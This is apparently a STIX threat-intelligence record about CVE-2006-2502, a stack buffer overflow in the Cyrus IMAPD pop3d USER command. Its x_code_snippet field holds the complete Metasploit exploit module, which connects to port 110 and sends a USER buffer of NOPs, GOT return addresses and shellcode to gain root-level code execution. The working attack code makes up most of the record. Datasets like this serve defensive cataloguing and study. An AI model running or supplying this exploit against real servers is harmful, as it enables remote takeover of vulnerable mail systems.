{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--bd5dbd64-3772-40ed-9992-87ed8838ca32",
    "created": "2024-08-14T17:04:50.909926Z",
    "modified": "2024-08-14T17:04:50.90993Z",
    "name": "Cyrus IMAPD pop3d popsubfolders USER Buffer Overflow",
    "description": " This exploit takes advantage of a stack based overflow.  Once the stack corruption has occurred it is possible to overwrite a pointer which is later used for a memcpy. This gives us a write anything anywhere condition similar to a format string vulnerability.  NOTE: The popsubfolders option is a non-default setting.  I chose to overwrite the GOT with my shellcode and return to it. This defeats the VA random patch and possibly other stack protection features.  Tested on gentoo-sources Linux 2.6.16. Although Fedora CORE 5 ships with a version containing the vulnerable code, it is not exploitable due to the use of the FORTIFY_SOURCE compiler enhancement ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/pop3/cyrus_pop3d_popsubfolders.rb",
            "external_id": "cyrus_pop3d_popsubfolders.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-2502"
        },
        {
            "source_name": "reference",
            "url": "http://archives.neohapsis.com/archives/fulldisclosure/2006-05/0527.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Cyrus IMAPD pop3d popsubfolders USER Buffer Overflow',\n      'Description'    => %q{\n          This exploit takes advantage of a stack based overflow.  Once the stack\n        corruption has occurred it is possible to overwrite a pointer which is\n        later used for a memcpy. This gives us a write anything anywhere condition\n        similar to a format string vulnerability.\n\n        NOTE: The popsubfolders option is a non-default setting.\n\n        I chose to overwrite the GOT with my shellcode and return to it. This\n        defeats the VA random patch and possibly other stack protection features.\n\n        Tested on gentoo-sources Linux 2.6.16. Although Fedora CORE 5 ships with\n        a version containing the vulnerable code, it is not exploitable due to the\n        use of the FORTIFY_SOURCE compiler enhancement\n      },\n      'Author'         => [ 'bannedit', 'jduck' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2006-2502' ],\n          [ 'OSVDB', '25853' ],\n          [ 'BID', '18056' ],\n          [ 'EDB', '2053' ],\n          [ 'EDB', '2185' ],\n          [ 'URL', 'http://archives.neohapsis.com/archives/fulldisclosure/2006-05/0527.html' ],\n        ],\n      'Payload'\t=>\n        {\n          'Space'\t=> 250,\n          'DisableNops' => true,\n        },\n      'Platform'\t=> 'linux',\n      'Targets'\t=>\n        [\n          # bannedit: 0x080fd204\n          # K-sPecial: 0x8106c20 (debian 3.1 - 2.6.16-rc6)\n          [ 'Gentoo 2006.0 Linux 2.6', { 'Ret' => 0x080fd318 } ],\n        ],\n      'Privileged'\t\t=> true,\n      'DisclosureDate'\t=> '2006-05-21',\n      'DefaultTarget'\t=> 0))\n\n    register_options( [ Opt::RPORT(110) ])\n  end\n\n\n\n  def exploit\n\n    connect\n    banner = sock.get_once.to_s.strip\n\n    print_status \"Banner: #{banner}\"\n\n    # NOTE: orig poc shellcode len: 84\n\n    # kcope: 352+84+86+4 (nops,sc,nops,ret)\n    # K-sPecial: 84+(120*4) (sc,addrs)\n    # bannedit: 265+8+250+29+16\n    shellcode = payload.encoded\n\n    buf = \"USER \"\n    buf << make_nops(265)\n    # return address\n    buf << [target.ret].pack('V') * 2\n    buf << make_nops(250 - shellcode.length)\n    buf << shellcode\n    buf << make_nops(29)\n    sc_addr = target.ret - 277\n    buf << [sc_addr].pack('V') * 4\n    buf << \"\\r\\n\"\n\n    sock.send(buf, 0)\n    disconnect\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-05-21",
    "x_mitre_platforms": [
        "linux'"
    ]
}